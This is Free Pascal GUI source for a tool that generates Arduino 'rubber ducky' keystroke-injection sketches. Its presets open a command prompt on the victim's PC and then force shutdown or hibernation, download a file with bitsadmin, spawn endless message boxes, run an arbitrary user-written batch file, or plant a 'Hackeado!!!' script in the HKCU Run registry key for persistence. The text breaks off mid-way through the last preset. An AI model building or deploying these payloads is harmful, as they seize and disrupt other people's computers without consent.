unit Unit1;

{$mode objfpc}{$H+}

interface

uses
  Classes, SysUtils, Forms, Controls, Graphics, Dialogs, StdCtrls, Menus;

type

  { TForm1 }

  TForm1 = class(TForm)
    Button1: TButton;
    Button2: TButton;
    ComboBox1: TComboBox;
    Edit1: TEdit;
    Edit2: TEdit;
    Edit3: TEdit;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    Label5: TLabel;
    Label6: TLabel;
    Memo1: TMemo;
    Memo2: TMemo;
    SelectDirectoryDialog1: TSelectDirectoryDialog;
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure ComboBox1Select(Sender: TObject);
    procedure Edit2Change(Sender: TObject);
    procedure FormCreate(Sender: TObject);
  private

  public

  end;

var
  Form1: TForm1;

implementation

{$R *.lfm}

{ TForm1 }

procedure TForm1.Button1Click(Sender: TObject);
var
  arquivo : string;
  nomeArquivo : string;
  ino, ino2 : string;
  Varquivo : TextFile;
begin
     if (ComboBox1.ItemIndex = 0) then
     begin
        nomeArquivo := '\Rubber_CMD\Rubber_CMD.txt';
      arquivo := Edit1.Text;
      if not DirectoryExists(arquivo+'\Rubber_CMD') then
         ForceDirectories(arquivo+'\Rubber_CMD');
      ino := arquivo+'\Rubber_CMD\Rubber_CMD.txt';
      ino2 := arquivo+'\Rubber_CMD\Rubber_CMD.ino'
     end;
     if (ComboBox1.ItemIndex = 1) then
     begin
        nomeArquivo := '\Rubber_EXEC\Rubber_EXEC.txt';
      arquivo := Edit1.Text;
      if not DirectoryExists(arquivo+'\Rubber_EXEC') then
         ForceDirectories(arquivo+'\Rubber_EXEC');
      ino := arquivo+'\Rubber_EXEC\Rubber_EXEC.txt';
      ino2 := arquivo+'\Rubber_EXEC\Rubber_EXEC.ino'
     end;
     if (ComboBox1.ItemIndex = 2) then
     begin
        nomeArquivo := '\Rubber_APAG\Rubber_APAG.txt';
      arquivo := Edit1.Text;
      if not DirectoryExists(arquivo+'\Rubber_APAG') then
         ForceDirectories(arquivo+'\Rubber_APAG');
      ino := arquivo+'\Rubber_APAG\Rubber_APAG.txt';
      ino2 := arquivo+'\Rubber_APAG\Rubber_APAG.ino'
     end;
     if (ComboBox1.ItemIndex = 3) then
     begin
        nomeArquivo := '\Rubber_LOGO\Rubber_LOGO.txt';
      arquivo := Edit1.Text;
      if not DirectoryExists(arquivo+'\Rubber_LOGO') then
         ForceDirectories(arquivo+'\Rubber_LOGO');
      ino := arquivo+'\Rubber_LOGO\Rubber_LOGO.txt';
      ino2 := arquivo+'\Rubber_LOGO\Rubber_LOGO.ino'
     end;
     if (ComboBox1.ItemIndex = 4) then
     begin
        nomeArquivo := '\Rubber_IFINITEMSG\Rubber_IFINITEMSG.txt';
      arquivo := Edit1.Text;
      if not DirectoryExists(arquivo+'\Rubber_IFINITEMSG') then
         ForceDirectories(arquivo+'\Rubber_IFINITEMSG');
      ino := arquivo+'\Rubber_IFINITEMSG\Rubber_IFINITEMSG.txt';
      ino2 := arquivo+'\Rubber_IFINITEMSG\Rubber_IFINITEMSG.ino'
     end;
     if (ComboBox1.ItemIndex = 5) then
     begin
        nomeArquivo := '\Rubber_OFF\Rubber_OFF.txt';
      arquivo := Edit1.Text;
      if not DirectoryExists(arquivo+'\Rubber_OFF') then
         ForceDirectories(arquivo+'\Rubber_OFF');
      ino := arquivo+'\Rubber_OFF\Rubber_OFF.txt';
      ino2 := arquivo+'\Rubber_OFF\Rubber_OFF.ino'
     end;
     if (ComboBox1.ItemIndex = 6) then
     begin
        nomeArquivo := '\Rubber_EXECBAT\Rubber_EXECBAT.txt';
      arquivo := Edit1.Text;
      if not DirectoryExists(arquivo+'\Rubber_EXECBAT') then
         ForceDirectories(arquivo+'\Rubber_EXECBAT');
      ino := arquivo+'\Rubber_EXECBAT\Rubber_EXECBAT.txt';
      ino2 := arquivo+'\Rubber_EXECBAT\Rubber_EXECBAT.ino'
     end;
     if (ComboBox1.ItemIndex = 7) then
     begin
        nomeArquivo := '\Rubber_MESSAGE\Rubber_MESSAGE.txt';
      arquivo := Edit1.Text;
      if not DirectoryExists(arquivo+'\Rubber_MESSAGE') then
         ForceDirectories(arquivo+'\Rubber_MESSAGE');
      ino := arquivo+'\Rubber_MESSAGE\Rubber_MESSAGE.txt';
      ino2 := arquivo+'\Rubber_MESSAGE\Rubber_MESSAGE.ino'
     end;
     if (ComboBox1.ItemIndex = 8) then
     begin
        nomeArquivo := '\Rubber_RESET\Rubber_RESET.txt';
      arquivo := Edit1.Text;
      if not DirectoryExists(arquivo+'\Rubber_RESET') then
         ForceDirectories(arquivo+'\Rubber_RESET');
      ino := arquivo+'\Rubber_RESET\Rubber_RESET.txt';
      ino2 := arquivo+'\Rubber_RESET\Rubber_RESET.ino'
     end;
     if (ComboBox1.ItemIndex = 9) then
     begin
        nomeArquivo := '\Rubber_WALLPAPER\Rubber_WALLPAPER.txt';
      arquivo := Edit1.Text;
      if not DirectoryExists(arquivo+'\Rubber_WALLPAPER') then
         ForceDirectories(arquivo+'\Rubber_WALLPAPER');
      ino := arquivo+'\Rubber_WALLPAPER\Rubber_WALLPAPER.txt';
      ino2 := arquivo+'\Rubber_WALLPAPER\Rubber_WALLPAPER.ino'
     end;
      if (arquivo = '')then
      begin
        ShowMessage('Caminho de destino invalido');
        end
        else
        begin
          AssignFile(Varquivo,arquivo+nomeArquivo);
          if not (FileExists(arquivo+nomeArquivo)) then
          begin
            if (ComboBox1.ItemIndex <> null) then
            begin
              Rewrite(Varquivo);
              Append(Varquivo);
              Write(Varquivo,Memo1.Text);
              CloseFile(Varquivo);
              RenameFile(ino,ino2);
              ShowMessage('Arquivo gerado com sucesso!');
              Memo1.Clear;
            end;

          end;
      end;


end;

procedure TForm1.Button2Click(Sender: TObject);
begin
  if SelectDirectoryDialog1.Execute then
  Edit1.Text:=SelectDirectoryDialog1.FileName;
end;

procedure TForm1.ComboBox1Select(Sender: TObject);
begin
  Memo1.Clear;
  Memo2.Clear;
  if (ComboBox1.ItemIndex = 7) then
  begin
    //Label4.Visible := true;
    //Edit2.Visible := true;
    end
  else
    begin
    //Label4.Visible := false;
    //Edit2.Visible := false;
  end;
  //Abrir CMD index 0
  if (ComboBox1.ItemIndex = 0) then
  begin
    Memo1.Append('/* Rubberduino Escrito por Bruno Alves */');
    Memo1.Append('#include "Keyboard.h"');
    Memo1.Append('int ok = 0;');
    Memo1.Append('void setup(){');
    Memo1.Append('     Keyboard.begin();');
    Memo1.Append('}');
    Memo1.Append('void loop(){');
    Memo1.Append('if (ok < 1){');
    Memo1.Append('     delay(1000);');
    Memo1.Append('     Keyboard.press(128);//CTRL');
    Memo1.Append('     delay(50);');
    Memo1.Append('     Keyboard.write(177);//ESC  ');
    Memo1.Append('     delay(50); ');
    Memo1.Append('     Keyboard.releaseAll();');
    Memo1.Append('     delay(200); ');
    Memo1.Append('     Keyboard.print("cmd");');
    Memo1.Append('     delay(1000); ');
    Memo1.Append('     Keyboard.write(176);//ENTER ');
    Memo1.Append('     Keyboard.releaseAll();');
    Memo1.Append('     delay(1000);');
    Memo1.Append('     ok++;');
    Memo1.Append('}');
    Memo1.Append('}');
  end;
  //Executar programa index 1
  if (ComboBox1.ItemIndex = 1) then
  begin
    Memo1.Append('/* Rubberduino Escrito por Bruno Alves */');
    Memo1.Append('#include "Keyboard.h"');
    Memo1.Append('int ok = 0;');
    Memo1.Append('void setup(){');
    Memo1.Append('     Keyboard.begin();');
    Memo1.Append('}');
    Memo1.Append('void loop(){');
    Memo1.Append('if (ok < 1){');
    Memo1.Append('     delay(1000);');
    Memo1.Append('     Keyboard.press(128);//CTRL');
    Memo1.Append('     delay(50);');
    Memo1.Append('     Keyboard.write(177);//ESC  ');
    Memo1.Append('     delay(50); ');
    Memo1.Append('     Keyboard.releaseAll();');
    Memo1.Append('     delay(200); ');
    Memo1.Append('     Keyboard.print("cmd");');
    Memo1.Append('     delay(1000); ');
    Memo1.Append('     Keyboard.write(176);//ENTER ');
    Memo1.Append('     delay(1000); ');
    Memo1.Append('     Keyboard.print("start chrome https");');
    Memo1.Append('     Keyboard.write(63);');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("www.youtube.com");');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("channel");');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("UCoWA2vMv30ZSi4KqgEHKnbw");');
    Memo1.Append('     Keyboard.write(176);//ENTER ');
    Memo1.Append('     delay(1000);');
    Memo1.Append('     ok++;');
    Memo1.Append('}');
    Memo1.Append('}');
  end;
  //Apagão index 2
  if (ComboBox1.ItemIndex = 2) then
  begin
    Memo1.Append('/* Rubberduino Escrito por Bruno Alves */');
    Memo1.Append('#include "Keyboard.h"');
    Memo1.Append('int ok = 0;');
    Memo1.Append('void setup(){');
    Memo1.Append('     Keyboard.begin();');
    Memo1.Append('}');
    Memo1.Append('void loop(){');
    Memo1.Append('if (ok < 1){');
    Memo1.Append('     delay(1000);');
    Memo1.Append('     Keyboard.press(128);//CTRL');
    Memo1.Append('     delay(50);');
    Memo1.Append('     Keyboard.write(177);//ESC  ');
    Memo1.Append('     delay(50); ');
    Memo1.Append('     Keyboard.releaseAll();');
    Memo1.Append('     delay(200); ');
    Memo1.Append('     Keyboard.print("cmd");');
    Memo1.Append('     delay(1000); ');
    Memo1.Append('     Keyboard.write(176);//ENTER ');
    Memo1.Append('     delay(1000); ');
    Memo1.Append('     Keyboard.print("powercfg -h on");');
    Memo1.Append('     Keyboard.write(176);//ENTER ');
    Memo1.Append('     Keyboard.print("shutdown ");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("h ");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("f ");');
    Memo1.Append('     Keyboard.write(176);//ENTER ');
    Memo1.Append('     delay(1000);');
    Memo1.Append('     ok++;');
    Memo1.Append('}');
    Memo1.Append('}');
  end;
    //Baixar Logo do canal index 3
  if (ComboBox1.ItemIndex = 3) then
  begin
    Memo1.Append('/* Rubberduino Escrito por Bruno Alves */');
    Memo1.Append('#include "Keyboard.h"');
    Memo1.Append('int ok = 0;');
    Memo1.Append('void setup(){');
    Memo1.Append('     Keyboard.begin();');
    Memo1.Append('}');
    Memo1.Append('void loop(){');
    Memo1.Append('if (ok < 1){');
    Memo1.Append('     delay(1000);');
    Memo1.Append('     Keyboard.press(128);//CTRL');
    Memo1.Append('     delay(50);');
    Memo1.Append('     Keyboard.write(177);//ESC  ');
    Memo1.Append('     delay(50); ');
    Memo1.Append('     Keyboard.releaseAll();');
    Memo1.Append('     delay(300); ');
    Memo1.Append('     Keyboard.print("cmd");');
    Memo1.Append('     delay(1000); ');
    Memo1.Append('     Keyboard.write(176);//ENTER ');
    Memo1.Append('     Keyboard.releaseAll();');
    Memo1.Append('     delay(1000);');
    Memo1.Append('     Keyboard.print("cd c");');
    Memo1.Append('     Keyboard.write(63);');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("Users");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("%username%");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("Desktop");');
    Memo1.Append('     Keyboard.write(176);');
    Memo1.Append('     delay(50);');
    Memo1.Append('     Keyboard.print("copy null starthck.bat");');
    Memo1.Append('     Keyboard.write(176);');
    Memo1.Append('     delay(50);');
    Memo1.Append('     Keyboard.print("echo >> starthck.bat cd C");');
    Memo1.Append('     Keyboard.write(63);');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("Users");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("%username%");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("Desktop");');
    Memo1.Append('     Keyboard.write(176);');
    Memo1.Append('     delay(50);');
    Memo1.Append('     Keyboard.print("echo >> starthck.bat ");');
    Memo1.Append('     Keyboard.print("bitsadmin ");');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("TRANSFER wall ");');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("DOWNLOAD ");');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("PRIORITY normal https");');
    Memo1.Append('     Keyboard.write(63);');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("yt3.ggpht.com");');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("a");');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("AATXAJxOEuux7syzX1Bsr6q5_b3d3EFSAE6W6avjaTdT=s900-c-k-c0x00ffffff-no-rj ");');
    Memo1.Append('     Keyboard.print(" c");');
    Memo1.Append('     Keyboard.write(63);');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("users");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("%username%");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("desktop");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("wlpp.jpg");');
    Memo1.Append('     Keyboard.write(176);//ENTER ');
    Memo1.Append('     Keyboard.releaseAll();');
    Memo1.Append('     Keyboard.print("starthck.bat");');
    Memo1.Append('     Keyboard.write(176);//ENTER ');
    Memo1.Append('     delay(1000);');
    Memo1.Append('     ok++;');
    Memo1.Append('}');
    Memo1.Append('}');
  end;
  //Infinitas mensagens index 4
  if (ComboBox1.ItemIndex = 4) then
  begin
    Memo1.Append('/* Rubberduino Escrito por Bruno Alves */');
    Memo1.Append('#include "Keyboard.h"');
    Memo1.Append('int ok = 0;');
    Memo1.Append('void setup(){');
    Memo1.Append('     Keyboard.begin();');
    Memo1.Append('}');
    Memo1.Append('void loop(){');
    Memo1.Append('if (ok < 1){');
    Memo1.Append('     delay(1000);');
    Memo1.Append('     Keyboard.press(128);//CTRL');
    Memo1.Append('     delay(50);');
    Memo1.Append('     Keyboard.write(177);//ESC  ');
    Memo1.Append('     delay(50); ');
    Memo1.Append('     Keyboard.releaseAll();');
    Memo1.Append('     delay(200); ');
    Memo1.Append('     Keyboard.print("cmd");');
    Memo1.Append('     delay(1000); ');
    Memo1.Append('     Keyboard.write(176);//ENTER ');
    Memo1.Append('     Keyboard.releaseAll();');
    Memo1.Append('     delay(1000);');
    (**********************************)
    Memo1.Append('     Keyboard.print("cd c"); ');
    Memo1.Append('     Keyboard.write(63); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("Users"); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("%username%"); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("Desktop"); ');
    Memo1.Append('     Keyboard.write(176); ');  //ENTER
    Memo1.Append('     delay(50); ');
    Memo1.Append('     Keyboard.print("copy null '+Edit3.Text+'.bat"); ');
    Memo1.Append('     Keyboard.write(176); ');  //ENTER
    Memo1.Append('     delay(50); ');
    Memo1.Append('     Keyboard.print("echo >> '+Edit3.Text+'.bat "); ');
    Memo1.Append('     Keyboard.print("MsgBox ");');
    Memo1.Append('     Keyboard.write(126);');
    Memo1.Append('     Keyboard.print("'+Edit2.Text+'");');
    Memo1.Append('     Keyboard.write(126);');
    Memo1.Append('     Keyboard.print(",16,");');
    Memo1.Append('     Keyboard.write(126);');
    Memo1.Append('     Keyboard.print("Paiduino");');
    Memo1.Append('     Keyboard.write(126);');
    Memo1.Append('     Keyboard.print(" > '+Edit3.Text+'.vbs");');
    Memo1.Append('     Keyboard.write(176); ');  //ENTER
    Memo1.Append('     Keyboard.print("echo >> '+Edit3.Text+'.bat "); ');
    Memo1.Append('     Keyboard.write(63); ');
    Memo1.Append('     Keyboard.print("start");');
    Memo1.Append('     Keyboard.write(176); ');  //ENTER
    Memo1.Append('     Keyboard.print("echo >> '+Edit3.Text+'.bat "); ');
    Memo1.Append('     Keyboard.print("'+Edit3.Text+'.vbs");');
    Memo1.Append('     Keyboard.write(176); ');  //ENTER
    Memo1.Append('     Keyboard.print("echo >> '+Edit3.Text+'.bat "); ');
    Memo1.Append('     Keyboard.print("goto start");');
    Memo1.Append('     Keyboard.write(176); ');  //ENTER
    Memo1.Append('     delay(200);');
    Memo1.Append('     Keyboard.print("'+Edit3.Text+'.bat");');
    Memo1.Append('     Keyboard.write(176);');//ENTER
    (**********************************)
    Memo1.Append('     ok++;');
    Memo1.Append('}');
    Memo1.Append('}');
  end;
  //Desligar o pc index 5
  if (ComboBox1.ItemIndex = 5) then
  begin
    Memo1.Append('/* Rubberduino Escrito por Bruno Alves */');
    Memo1.Append('#include "Keyboard.h"');
    Memo1.Append('int ok = 0;');
    Memo1.Append('void setup(){');
    Memo1.Append('     Keyboard.begin();');
    Memo1.Append('}');
    Memo1.Append('void loop(){');
    Memo1.Append('if (ok < 1){');
    Memo1.Append('     delay(1000);');
    Memo1.Append('     Keyboard.press(128);//CTRL');
    Memo1.Append('     delay(50);');
    Memo1.Append('     Keyboard.write(177);//ESC  ');
    Memo1.Append('     delay(50); ');
    Memo1.Append('     Keyboard.releaseAll();');
    Memo1.Append('     delay(200); ');
    Memo1.Append('     Keyboard.print("cmd");');
    Memo1.Append('     delay(1000); ');
    Memo1.Append('     Keyboard.write(176);//ENTER ');
    Memo1.Append('     Keyboard.releaseAll();');
    Memo1.Append('     delay(1000);');
    Memo1.Append('     Keyboard.print("shutdown -s -t 5");');
    Memo1.Append('     Keyboard.write(176);//ENTER ');
    Memo1.Append('     Keyboard.releaseAll();');
    Memo1.Append('     ok++;');
    Memo1.Append('}');
    Memo1.Append('}');
  end;
  //Escrever e executar um bat index 6
  if (ComboBox1.ItemIndex = 6) then
  begin
    Memo1.Append('/* Rubberduino Escrito por Bruno Alves */');
    Memo1.Append('#include "Keyboard.h"');
    Memo1.Append('int ok = 0;');
    Memo1.Append('void setup(){');
    Memo1.Append('     Keyboard.begin();');
    Memo1.Append('}');
    Memo1.Append('void loop(){');
    Memo1.Append('if (ok < 1){');
    Memo1.Append('     delay(1000);');
    Memo1.Append('     Keyboard.press(128);//CTRL');
    Memo1.Append('     delay(50);');
    Memo1.Append('     Keyboard.write(177);//ESC  ');
    Memo1.Append('     delay(50); ');
    Memo1.Append('     Keyboard.releaseAll();');
    Memo1.Append('     delay(200); ');
    Memo1.Append('     Keyboard.print("cmd");');
    Memo1.Append('     delay(1000); ');
    Memo1.Append('     Keyboard.write(176);//ENTER ');
    Memo1.Append('     Keyboard.releaseAll();');
    Memo1.Append('     delay(1000);');
    (**********************************)
    Memo1.Append('     Keyboard.print("cd c"); ');
    Memo1.Append('     Keyboard.write(63); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("Users"); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("%username%"); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("Desktop"); ');
    Memo1.Append('     Keyboard.write(176); ');  //ENTER
    Memo1.Append('     delay(50); ');
    Memo1.Append('     Keyboard.print("copy null '+Edit3.Text+'.bat"); ');
    Memo1.Append('     Keyboard.write(176); ');  //ENTER
    Memo1.Append('     delay(50); ');
    Memo1.Append('     Keyboard.print("echo >> '+Edit3.Text+'.bat cd C"); ');
    Memo1.Append('     Keyboard.write(63); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("Users"); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("%username%"); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("Desktop"); ');
    Memo1.Append('     Keyboard.write(176); ');  //ENTER
    Memo1.Append('     delay(50); ');
    Memo1.Append('     Keyboard.print("echo >> '+Edit3.Text+'.bat "); ');
    Memo1.Append('     Keyboard.print("'+Memo2.Text+'"); ');
    Memo1.Append('     Keyboard.write(176); ');  //ENTER
    Memo1.Append('     delay(200);');
    Memo1.Append('     Keyboard.print("'+Edit3.Text+'.bat");');
    Memo1.Append('     Keyboard.write(176);');//ENTER
    (**********************************)
    Memo1.Append('     ok++;');
    Memo1.Append('}');
    Memo1.Append('}');
  end;
  //Menssagem persistente index 7
  if (ComboBox1.ItemIndex = 7) then
  begin
    Memo1.Append('/* Rubberduino Escrito por Bruno Alves */');
    Memo1.Append('#include "Keyboard.h"');
    Memo1.Append('int ok = 0;');
    Memo1.Append('void setup(){');
    Memo1.Append('     Keyboard.begin();');
    Memo1.Append('}');
    Memo1.Append('void loop(){');
    Memo1.Append('if (ok < 1){');
    Memo1.Append('     delay(1000);');
    Memo1.Append('     Keyboard.press(128);//CTRL');
    Memo1.Append('     delay(50);');
    Memo1.Append('     Keyboard.write(177);//ESC  ');
    Memo1.Append('     delay(50); ');
    Memo1.Append('     Keyboard.releaseAll();');
    Memo1.Append('     delay(200); ');
    Memo1.Append('     Keyboard.print("cmd");');
    Memo1.Append('     delay(1000); ');
    Memo1.Append('     Keyboard.write(176);//ENTER ');
    Memo1.Append('     Keyboard.releaseAll();');
    Memo1.Append('     delay(1000);');
    (**********************************)
    Memo1.Append('     Keyboard.print("cd c"); ');
    Memo1.Append('     Keyboard.write(63); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("Users"); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("%username%"); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("Desktop"); ');
    Memo1.Append('     Keyboard.write(176); ');  //ENTER
    Memo1.Append('     delay(50); ');
    Memo1.Append('     Keyboard.print("copy null starthck.bat"); ');
    Memo1.Append('     Keyboard.write(176); ');  //ENTER
    Memo1.Append('     delay(50); ');
    Memo1.Append('     Keyboard.print("echo >> starthck.bat cd C"); ');
    Memo1.Append('     Keyboard.write(63); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("Users"); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("%username%"); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("Desktop"); ');
    Memo1.Append('     Keyboard.write(176); ');  //ENTER
    Memo1.Append('     delay(50); ');
    Memo1.Append('     Keyboard.print("echo >> starthck.bat "); ');
    Memo1.Append('     Keyboard.print("copy null hack.vbs"); ');
    Memo1.Append('     Keyboard.write(176); ');  //ENTER
    Memo1.Append('     delay(50); ');
    Memo1.Append('     delay(50); ');
    Memo1.Append('     Keyboard.print("echo >> hack.vbs msgbox "); ');
    Memo1.Append('     Keyboard.write(126); ');  //"
    Memo1.Append('     Keyboard.print("'+Edit2.Text+'"); ');
    Memo1.Append('     Keyboard.write(126); ');  //"
    Memo1.Append('     Keyboard.print(",vbcritical,"); ');
    Memo1.Append('     Keyboard.write(126); ');  //"
    Memo1.Append('     Keyboard.print("Hackeado!!!"); ');
    Memo1.Append('     Keyboard.write(126); ');  //"
    Memo1.Append('     Keyboard.write(176); ');  //ENTER
    Memo1.Append('     delay(50); ');
    Memo1.Append('     Keyboard.print("echo >> starthck.bat reg add "); ');
    Memo1.Append('     Keyboard.write(126); ');  //"
    Memo1.Append('     Keyboard.print("HKCU"); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("Software"); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("Microsoft"); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("Windows"); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("CurrentVersion"); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("Run"); ');
    Memo1.Append('     Keyboard.write(126); ');
    Memo1.Append('     Keyboard.print(" "); ');
    Memo1.Append('     Keyboard.write(220); ');
    Memo1.Append('     Keyboard.print("v hack "); ');
    Memo1.Append('     Keyboard.write(220); ');
    Memo1.Append('     Keyboard.print("t REG_SZ "); ');
    Memo1.Append('     Keyboard.write(220); ');
    Memo1.Append('     Keyboard.print("d C"); ');
    Memo1.Append('     Keyboard.write(63); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("Users"); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("%username%"); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("Desktop"); ');
    Memo1.Append('     Keyboard.write(236); ');
    Memo1.Append('     Keyboard.print("hack.vbs "); ');
    Memo1.Append('     Keyboard.write(220); ');
    Memo1.Append('     Keyboard.print("f"); ');
    Memo1.Append('     Keyboard.write(176); ');  //ENTER
    Memo1.Append('     delay(200);');
    Memo1.Append('     Keyboard.print("starthck.bat");');
    Memo1.Append('     Keyboard.write(176);');//ENTER
    (**********************************)
    Memo1.Append('     ok++;');
    Memo1.Append('}');
    Memo1.Append('}');
  end;
  //Reiniciar o pc index 8
  if (ComboBox1.ItemIndex = 8) then
  begin
    Memo1.Append('/* Rubberduino Escrito por Bruno Alves */');
    Memo1.Append('#include "Keyboard.h"');
    Memo1.Append('int ok = 0;');
    Memo1.Append('void setup(){');
    Memo1.Append('     Keyboard.begin();');
    Memo1.Append('}');
    Memo1.Append('void loop(){');
    Memo1.Append('if (ok <= 1){');
    Memo1.Append('     delay(1000);');
    Memo1.Append('     Keyboard.press(128);//CTRL');
    Memo1.Append('     delay(50);');
    Memo1.Append('     Keyboard.write(177);//ESC  ');
    Memo1.Append('     delay(50); ');
    Memo1.Append('     Keyboard.releaseAll();');
    Memo1.Append('     delay(200); ');
    Memo1.Append('     Keyboard.print("cmd");');
    Memo1.Append('     delay(1000); ');
    Memo1.Append('     Keyboard.write(176);//ENTER ');
    Memo1.Append('     Keyboard.releaseAll();');
    Memo1.Append('     delay(1000);');
    Memo1.Append('     Keyboard.print("shutdown -s -t 5");');
    Memo1.Append('     Keyboard.write(176);//ENTER ');
    Memo1.Append('     Keyboard.releaseAll();');
    Memo1.Append('     ok++;');
    Memo1.Append('}');
    Memo1.Append('}');
  end;
  //Reiniciar o pc index 9
  if (ComboBox1.ItemIndex = 9) then
  begin
    Memo1.Append('/* Rubberduino Escrito por Bruno Alves */');
    Memo1.Append('#include "Keyboard.h"');
    Memo1.Append('int ok = 0;');
    Memo1.Append('void setup(){');
    Memo1.Append('     Keyboard.begin();');
    Memo1.Append('}');
    Memo1.Append('void loop(){');
    Memo1.Append('if (ok < 1){');
    Memo1.Append('     delay(1000);');
    Memo1.Append('     Keyboard.press(128);//CTRL');
    Memo1.Append('     delay(50);');
    Memo1.Append('     Keyboard.write(177);//ESC  ');
    Memo1.Append('     delay(50); ');
    Memo1.Append('     Keyboard.releaseAll();');
    Memo1.Append('     delay(300); ');
    Memo1.Append('     Keyboard.print("cmd");');
    Memo1.Append('     delay(1000); ');
    Memo1.Append('     Keyboard.write(176);//ENTER ');
    Memo1.Append('     Keyboard.releaseAll();');
    Memo1.Append('     delay(1000);');
    Memo1.Append('     Keyboard.print("cd c");');
    Memo1.Append('     Keyboard.write(63);');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("Users");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("%username%");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("Desktop");');
    Memo1.Append('     Keyboard.write(176);');
    Memo1.Append('     delay(50);');
    Memo1.Append('     Keyboard.print("copy null starthck.bat");');
    Memo1.Append('     Keyboard.write(176);');
    Memo1.Append('     delay(50);');
    Memo1.Append('     Keyboard.print("echo >> starthck.bat cd C");');
    Memo1.Append('     Keyboard.write(63);');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("Users");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("%username%");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("Desktop");');
    Memo1.Append('     Keyboard.write(176);');
    Memo1.Append('     delay(50);');
    Memo1.Append('     Keyboard.print("echo >> starthck.bat ");');
    Memo1.Append('     Keyboard.print("bitsadmin ");');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("TRANSFER wall ");');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("DOWNLOAD ");');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("PRIORITY normal https");');
    Memo1.Append('     Keyboard.write(63);');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("yt3.ggpht.com");');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("a");');
    Memo1.Append('     Keyboard.write(220);');
    Memo1.Append('     Keyboard.print("AATXAJxOEuux7syzX1Bsr6q5_b3d3EFSAE6W6avjaTdT=s900-c-k-c0x00ffffff-no-rj ");');
    Memo1.Append('     Keyboard.print(" c");');
    Memo1.Append('     Keyboard.write(63);');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("users");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("%username%");');
    Memo1.Append('     Keyboard.write(236);');
    Memo1.Append('     Keyboard.print("desktop");');
